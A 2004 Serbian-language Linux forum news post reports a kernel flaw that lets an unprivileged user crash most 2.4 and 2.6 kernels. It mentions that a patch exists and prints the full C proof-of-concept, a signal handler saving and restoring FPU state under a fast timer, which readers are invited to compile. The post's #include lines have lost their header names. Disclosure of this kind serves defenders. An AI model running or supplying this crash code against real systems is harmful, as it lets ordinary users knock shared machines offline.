---
author: tomaja
date: "2004-06-16T16:07:08Z"
excerpt: |
  Pronadjen je propust u kernelu koji omogucava da se Linux "zakuca". Radi na vecinii 2.4.x i 2.6.x kernela, a moguce je oboriti "pingvina" kao obican user...
  Patch bi vec trebalo da postoji.

  <a href="http://reviewed.homelinux.org/news/2004-06-11_kernel_crash/index.html.en">Za vise informacija</a>
guid: https://forum.linuxo.org/2004/06/16/bug-u-kernelu/
id: 457
tc-thumb-fld:
- a:2:{s:9:"_thumb_id";b:0;s:11:"_thumb_type";s:10:"attachment";}
title: Bug u kernelu
url: /bug-u-kernelu/
---
Pronadjen je propust u kernelu koji omogucava da se Linux &#8222;zakuca&#8220;. Radi na vecinii 2.4.x i 2.6.x kernela, a moguce je oboriti &#8222;pingvina&#8220; kao obican user&#8230;  
Patch bi vec trebalo da postoji.

[Za vise informacija](http://reviewed.homelinux.org/news/2004-06-11_kernel_crash/index.html.en)<!--break-->Ovo je &#8222;magican&#8220; C kod koji kuca kernel. Mozete iskompajlirati ovo gcc-om i videti sta se desava

#include  
#include  
#include 

static void Handler(int ignore)  
{  
char fpubuf[108];  
\_\_asm\_\_ \_\_volatile\_\_ (&#8222;fsave %0  
&#8220; : : &#8222;m&#8220;(fpubuf));  
write(2, &#8222;*&#8220;, 1);  
\_\_asm\_\_ \_\_volatile\_\_ (&#8222;frstor %0  
&#8220; : : &#8222;m&#8220;(fpubuf));  
}

int main(int argc, char *argv[])  
{  
struct itimerval spec;  
signal(SIGALRM, Handler);  
spec.it\_interval.tv\_sec=0;  
spec.it\_interval.tv\_usec=100;  
spec.it\_value.tv\_sec=0;  
spec.it\_value.tv\_usec=100;  
setitimer(ITIMER_REAL, &spec, NULL);  
while(1)  
write(1, &#8222;.&#8220;, 1);

return 0;  
}

[Креирај тему форума везану за овај текст](https://linuxo.org/nova-tema-na-forumu/?se_pid=457)